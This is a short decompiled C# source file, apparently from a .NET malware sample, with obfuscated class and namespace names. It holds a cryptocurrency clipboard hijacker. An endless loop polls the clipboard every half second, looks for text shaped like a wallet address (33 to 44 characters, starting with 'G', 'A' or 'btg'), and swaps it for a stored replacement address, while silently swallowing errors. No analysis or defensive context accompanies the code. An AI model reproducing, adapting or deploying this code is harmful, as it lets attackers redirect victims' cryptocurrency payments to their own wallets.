using System;
using System.Threading;
using Client.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns21;

namespace ns34;

public class GClass33
{
	public static void smethod_0()
	{
		string text = "";
		_Closure_0024__R1_002D0 closure_0024__R1_002D = default(_Closure_0024__R1_002D0);
		while (true)
		{
			try
			{
				text = ((Computer)MyProject.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_24, false) != 0 && text.Length >= 33 && text.Length <= 44 && (text.StartsWith("G") || text.StartsWith("A") || text.StartsWith("btg")))
				{
					closure_0024__R1_002D = new _Closure_0024__R1_002D0(closure_0024__R1_002D);
					closure_0024__R1_002D._0024VB_0024NonLocal_2 = ((Computer)MyProject.Computer).get_Clipboard();
					Thread thread = new Thread(closure_0024__R1_002D._Lambda_0024__R2);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_24);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
